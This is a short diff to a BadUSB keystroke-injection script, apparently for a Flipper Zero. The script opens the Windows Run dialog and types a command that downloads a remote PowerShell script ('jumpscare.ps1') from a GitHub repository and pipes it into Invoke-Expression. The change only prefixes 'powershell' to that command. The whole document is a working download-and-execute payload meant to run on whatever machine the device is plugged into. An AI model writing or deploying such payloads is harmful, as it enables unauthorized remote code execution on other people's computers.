@@ -1,5 +1,5 @@
 GUI r
 DELAY 80
-STRING iwr https://raw.githubusercontent.com/SIGUrger/FlipperZeroBadusb/main/Resources/jumpscare.ps1 | iex
+STRING powershell iwr https://raw.githubusercontent.com/SIGUrger/FlipperZeroBadusb/main/Resources/jumpscare.ps1 | iex
 DELAY 80
 ENTER
